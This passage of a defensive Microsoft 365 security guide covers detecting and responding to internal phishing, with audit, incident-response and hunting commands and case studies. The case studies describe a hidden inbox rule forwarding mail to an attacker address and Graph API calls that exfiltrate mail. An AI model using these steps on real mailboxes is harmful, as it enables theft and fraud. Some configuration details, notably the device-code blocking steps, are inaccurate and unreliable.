# Enable unified audit logging
Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $true

# Verify enabled
Get-AdminAuditLogConfig | Select-Object UnifiedAuditLogIngestionEnabled
```

---

**2. Block Device Code Flow for Untrusted Applications**

Storm-2372 exploits device code authentication. Block this flow for all non-essential applications.

**Manual Steps (Entra ID Conditional Access):**

1. Navigate to **Entra ID** → **Security** → **Conditional Access** → **New policy**
2. **Assignments:**
   - **Users or workload identities:** All users
   - **Cloud apps or actions:** All cloud apps
3. **Conditions:**
   - **Client app:** Legacy authentication clients
4. **Access controls:**
   - **Grant:** Block access
5. **Enable policy**

**PowerShell (Disable Device Code Flow):**

```powershell
# Disable device code flow in Entra ID
# (Note: This is a preview feature as of Dec 2025)

# Via Microsoft Graph
$params = @{
    displayName = "Block Device Code Flow"
    conditions = @{
        clientAppTypes = @("exchangeActiveSync", "browserAgentSilent")
    }
    grantControls = @{
        builtInControls = @("block")
    }
}

# Create policy (requires Graph API call)
```

---

**3. Implement Conditional Access to Detect Impossible Travel**

Detect sign-ins from geographically impossible locations within minutes.

**Manual Steps (Entra ID):**

1. Navigate to **Entra ID** → **Security** → **Identity Protection** → **Sign-in risk policy**
2. Configure:
   - **Risk level:** Medium and above
   - **Access controls:** Require MFA
3. Enable policy

---

### Priority 2: HIGH

**4. Disable External Email Forwarding**

Prevent users from creating forwarding rules to external addresses.

**Manual Steps (Exchange Online):**

1. Navigate to **Exchange admin center**
2. Go to **Mail flow** → **Rules**
3. Create transport rule:
   - **Name:** "Prevent external forwarding"
   - **Condition:** "If the message sender is located inside the organization"
   - **Action:** "Reject the message"
   - **Exception:** For authorized forwarding addresses only

**PowerShell:**

```powershell
# Create organization-wide rule to block external forwarding
New-TransportRule -Name "Block external forwarding" `
  -SentToScope NotInOrganization `
  -RejectMessageReasonText "External email forwarding is not permitted"
```

---

**5. Enable Mailbox Auditing**

Ensure mailbox auditing is enabled for all users to track mailbox operations.

**PowerShell:**

```powershell
# Enable mailbox auditing for all mailboxes
$mailboxes = Get-Mailbox -ResultSize Unlimited

foreach ($mailbox in $mailboxes) {
    Set-Mailbox -Identity $mailbox.Identity -AuditEnabled $true
    
    # Set comprehensive audit logging
    Set-Mailbox -Identity $mailbox.Identity `
      -AuditOwner "Create", "Delete", "SoftDelete", "Update" `
      -AuditDelegate "Create", "Delete", "SoftDelete", "Update" `
      -AuditAdmin "Create", "Delete", "SoftDelete", "Update"
}
```

---

**6. Implement User Security Awareness Training**

Train users to recognize internal phishing, especially:

- Emails from colleagues requesting urgent action
- Calendar invitations with malicious links
- Device code/verification code prompts
- Requests to "approve" transfers or access

**Key Messages:**

- "Even if an email comes from a colleague's account, verify via phone or in-person before clicking links"
- "Calendar invitations can be phishing—don't trust them blindly"
- "Microsoft will never ask you to enter a device code in an email or Teams message"
- "If something seems urgent or suspicious, contact IT directly"

---

### Priority 3: MEDIUM

**7. Monitor for Suspicious Outbound Email Patterns**

Configure alerts for accounts sending bulk emails to external recipients.

**Sentinel Alert:**

```kusto
EmailEvents
| where SenderMailFromDomain endswith "@company.com"
| where RecipientEmailDomain !endswith "@company.com"
| summarize
    EmailCount = count(),
    UniqueRecipients = dcount(RecipientEmailAddress)
    by SenderAddress, bin(TimeGenerated, 1h)
| where EmailCount > 50
| project
    TimeGenerated,
    SenderAddress,
    EmailCount,
    Severity = "High",
    AlertTitle = "Bulk external email detected"
```

---

**Validation Command (Verify Mitigations):**

```powershell
# Verify unified audit logging is enabled
Get-AdminAuditLogConfig | Select-Object UnifiedAuditLogIngestionEnabled

# Verify mailbox auditing is enabled (sample)
Get-Mailbox -Identity "alice@company.com" | Select-Object AuditEnabled

# Verify external forwarding is blocked
Get-TransportRule | Where-Object { $_.Name -like "*forward*" }
```

---

## 10. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

**Email-Based IOCs:**

- **Emails from internal accounts with suspicious subjects:** "Urgent action", "Verify account", "Click here", "Transfer approval"
- **Emails containing device code prompts or verification code requests**
- **Calendar invitations with external domain links** (e.g., firebase.com, blob.core.windows.net)
- **Bulk internal emails sent in compressed timeframe** (50+ emails in 1 hour)
- **Emails sent to external recipients from internal account outside business hours**

**Account-Based IOCs:**

- **New inbox rules created by non-admin users**
- **Forwarding rules pointing to external email addresses**
- **Multiple failed sign-in attempts followed by successful login from unusual IP**
- **Sign-ins from cloud provider IPs** (Firebase, Azure Blob, AWS S3)
- **Impossible travel:** Sign-in from geographic location inconsistent with previous location

**Behavioral IOCs:**

- **Sudden increase in mailbox rule creation**
- **Account accessing mailbox at unusual times** (e.g., 3 AM when user normally doesn't work)
- **Account accessing mailbox from multiple geolocations simultaneously**
- **Graph API calls to retrieve mailbox contents** (indicative of token-based access)

### Forensic Artifacts

**Unified Audit Log Entries:**

- **Operations:** "New-InboxRule", "Set-InboxRule", "Enable-InboxRule"
- **Objects:** ForwardTo, RedirectTo, HiddenFromExchangeAdmins properties
- **Mailbox Audit Logs:** "MailboxLogin", "Send", "Create", "Delete"

**Sign-In Logs:**

- **Suspicious IP addresses** (attacker's infrastructure)
- **Unusual user agents** (legacy protocols, VPN clients)
- **Failed MFA attempts** followed by successful logins (MFA bypass)

**Graph API Logs:**

- **Calls to /messages endpoint** (retrieving emails)
- **Calls to /sendMail endpoint** (sending emails from hijacked account)
- **Calls to /drive/root/children** (accessing OneDrive files)

### Response Procedures

**Immediate Actions (0-15 minutes):**

1. **Revoke User Sessions:**

```powershell
# Revoke all active sessions for compromised user
Revoke-AzureADUserAllRefreshToken -ObjectId (Get-MgUser -Filter "userPrincipalName eq 'alice@company.com'").Id
```

2. **Reset Password and Enable MFA:**

```powershell
# Force password reset
Update-MgUser -UserId "alice@company.com" -ForceChangePasswordNextSignIn $true

# Enroll user in MFA (if not already enabled)
# (Requires separate MFA enrollment process)
```

3. **Remove Malicious Inbox Rules:**

```powershell
# Get all inbox rules for compromised mailbox
$rules = Get-InboxRule -Mailbox "alice@company.com"

# Remove suspicious rules
$rules | Where-Object { $_.ForwardTo -like "*@gmail.com" -or $_.ForwardTo -like "*@external.com" } | Remove-InboxRule -Confirm:$false

# Remove hidden rules (may require MAPI access)
# Hidden rules don't appear in standard Get-InboxRule queries
```

4. **Check for Forwarding Rules at Mailbox Level:**

```powershell
# Check mailbox-level forwarding (different from inbox rules)
Get-Mailbox -Identity "alice@company.com" | Select-Object ForwardingAddress, ForwardingSmtpAddress

# Remove if suspicious
Set-Mailbox -Identity "alice@company.com" -ForwardingSmtpAddress $null
```

5. **Revoke MFA Methods (if attacker added new methods):**

```powershell
# List all MFA methods
Get-MgUserAuthenticationMethod -UserId "alice@company.com"

# Remove suspicious methods
Get-MgUserAuthenticationMethod -UserId "alice@company.com" | `
  Where-Object { $_.DisplayName -like "*new*" -or $_.DisplayName -like "*secondary*" } | `
  Remove-MgUserAuthenticationMethod
```

**Containment (15-60 minutes):**

6. **Search for Internal Phishing Emails Sent from Compromised Account:**

```powershell
# Find all emails sent from compromised account in past 7 days
Search-UnifiedAuditLog -UserIds "alice@company.com" `
  -Operations "Send" `
  -StartDate (Get-Date).AddDays(-7) | `
  Export-Csv -Path "C:\Investigation\alice_sent_emails.csv"

# Review recipient list to identify internal phishing victims
```

7. **Identify Secondary Compromised Accounts:**

```powershell
# Check sign-in logs for accounts that clicked malicious links
# Look for sign-ins from attacker IPs within 30 minutes of phishing email send

$suspiciousIPs = @(
    # Attacker infrastructure IPs (obtained from firewall/proxy logs)
)

Get-MgAuditLogSignIn -Filter "createdDateTime gt 2025-01-01" | `
  Where-Object { $_.IPAddress -in $suspiciousIPs } | `
  Select-Object -ExpandProperty UserPrincipalName | `
  Sort-Object -Unique | `
  Export-Csv -Path "C:\Investigation\secondary_compromised_accounts.csv"
```

8. **Investigate Hidden Inbox Rules:**

```powershell
# Query unified logs for hidden rule creation
Search-UnifiedAuditLog -Operations "Set-InboxRule" `
  -StartDate (Get-Date).AddDays(-7) | `
  Where-Object { $_.AuditData -like "*HiddenFromExchangeAdmins*true*" } | `
  Export-Csv -Path "C:\Investigation\hidden_rules.csv"
```

**Recovery (1-24 hours):**

9. **Threat Hunt for Similar Compromises:**

```powershell
# Search for other accounts with suspicious inbox rule creation patterns
Search-UnifiedAuditLog -Operations "New-InboxRule","Set-InboxRule" `
  -StartDate (Get-Date).AddDays(-7) | `
  Where-Object { $_.AuditData -like "*@external*" -or $_.AuditData -like "*@gmail*" } | `
  Group-Object UserIds | `
  Select-Object Name, Count | `
  Where-Object { $_.Count -gt 1 }
```

10. **Perform EDiscovery to Recover Deleted Phishing Emails:**

```powershell
# If attacker deleted phishing emails to cover tracks, recover from soft-delete
# (Requires Discovery Management role)

New-ComplianceSearch -Name "Internal phishing investigation" `
  -ExchangeLocation "alice@company.com" `
  -ContentMatchQuery '(from:"alice@company.com" AND (subject:"verify" OR subject:"urgent"))'

# Start search
Start-ComplianceSearch -Identity "Internal phishing investigation"

# Export results
New-ComplianceSearchAction -SearchIdentity "Internal phishing investigation" `
  -Action Export
```

---

## 11. RELATED ATTACK CHAIN

| Step | Phase | Technique | Description |
|---|---|---|---|
| **1** | **Initial Access** | T1566.002 (Phishing: Spearphishing Link) or [IA-PHISH-004] | **Attacker uses external phishing to compromise initial user account** |
| **2** | **Persistence** | T1114.003 (Email Forwarding Rule) | **Attacker creates hidden inbox rules to forward emails to external address** |
| **3** | **Lateral Movement** | **[IA-PHISH-005]** | **Attacker uses compromised account to send internal phishing to secondary targets** |
| **4** | **Credential Access** | T1110 (Brute Force) or Device Code Phishing | **Secondary victims click malicious links and enter credentials or grant tokens** |
| **5** | **Impact** | T1537 (Transfer Data to Cloud Account) | **Attacker exfiltrates emails, files, calendar data from secondary accounts** |
| **6** | **Impact** | T1531 (Account Access Removal) | **BEC: Attacker attempts unauthorized funds transfers, billing changes** |

---

## 12. REAL-WORLD EXAMPLES

### Example 1: Storm-2372 Device Code Phishing Campaign (Aug 2024 - Present)

**Threat Actor:** Russian-linked state-sponsored group Storm-2372

**Targets:** Government agencies, NGOs, defense contractors, critical infrastructure (Europe, North America, Africa, Middle East)

**Timeline:**

- **August 2024:** Initial reconnaissance and device code phishing email creation
- **September 2024:** First phishing emails detected targeting European government agencies
- **October 2024 - Present:** Ongoing campaigns with 300+ organizations targeted; thousands of phishing emails sent

**Methodology:**

1. Attacker sends Teams meeting invitation via email
2. Subject: "Online event" or "Meeting invitation"
3. Victims click invitation link
4. Page displays legitimate Microsoft login
5. Attacker uses device code flow to capture access tokens
6. Attacker impersonates victim and performs keyword searches for "password", "admin", "credentials", "secret", "ministry", "gov"
7. Attacker exfiltrates emails via Graph API

**Data Exfiltration:**

```
Graph API calls observed:
- https://graph.microsoft.com/v1.0/me/messages?$filter=subject contains 'password'
- https://graph.microsoft.com/v1.0/me/mailFolders/inbox/messages?$top=500
- https://graph.microsoft.com/v1.0/me/drive/root/children
```

**Impact:**

- Confidential government documents exfiltrated
- Defense contractor email compromised
- Diplomatic communications intercepted

**Microsoft's Response:**

- Public alert issued May 2025 warning of Storm-2372 device code phishing
- Recommendation: Block device code flow where not required
- Recommendation: Enable "known senders" warning in Microsoft apps

---

### Example 2: Check Point Google Calendar Phishing Campaign (December 2024)

**Threat Actor:** Financially-motivated cybercriminals

**Targets:** 300+ organizations across banking, healthcare, education, construction

**Timeline:**

- **December 2024:** Campaign discovered targeting multiple sectors
- **January 2025:** Campaign continues with refined targeting

**Methodology:**

1. Attacker crafts calendar invitation (.ics file) with malicious link
2. Email appears to come from "Google Calendar Notification" (spoofed DKIM/SPF)
3. Invitations pass email security filters (originate from legitimate Google infrastructure)
4. Victims click invitation
5. Redirected to Google Forms → reCAPTCHA clone → Fake cryptocurrency support page
6. Victims enter credentials

**Why Successful:**

- Calendar invitations bypass email security scanners
- Google Calendar emails pass authentication checks
- Users don't expect phishing in calendar invitations
- Multiple redirect stages confuse victims and bypass analysis

**Impact:**

- Thousands of credentials harvested
- Cryptocurrency accounts drained
- Corporate email accounts compromised

---

### Example 3: Synacktiv BEC Investigation (2021-2025)

**Type:** Business Email Compromise (BEC) attack leveraging internal phishing

**Timeline:**

- **Day 0:** Initial external phishing compromises finance team member
- **Day 1-2:** Attacker creates hidden inbox rules, explores organizational structure
- **Day 3-25:** Attacker sends internal phishing emails to other finance team members and external suppliers
- **Day 26:** Fraud detected when bank notifies company of suspicious wire transfer

**Attack Chain:**

```
Day 0: External phishing targets finance@company.com
         ↓
Day 1: Attacker creates inbox rule: 
       ForwardTo: attacker@gmail.com
       HiddenFromExchangeAdmins: $true
         ↓
Day 2: Attacker enumerates GAL, identifies suppliers and executives
         ↓
Day 3-25: Internal phishing emails sent to:
          - finance@company.com
          - accounting@company.com
          - supplier1@supplier.com (external)
          - supplier2@supplier.com (external)
         ↓
Day 26: Wire transfer attempted to attacker-controlled account
         ↓
Day 27: Fraud detected; incident response begins
```

**Persistence Mechanism:**

Despite password reset at Day 10, attacker maintained access via hidden inbox rule created at Day 1. The rule continued forwarding all incoming emails to attacker@gmail.com, allowing attacker to:

- Monitor company email traffic
- Identify additional targets
- Time phishing emails to coincide with legitimate business activity
- Remain undetected for 25+ days

**Detection Gap:**

Unified audit logging was not enabled by default. Attackers rely on this configuration gap to remain undetected. Even with audit logging enabled, hidden inbox rules may not appear in standard queries.

**References:**

- [Synacktiv - Yet Another BEC Investigation on M365 (2025-12-15)](https://www.synacktiv.com/publications/yet-another-bec-investigation-on-m365)

---
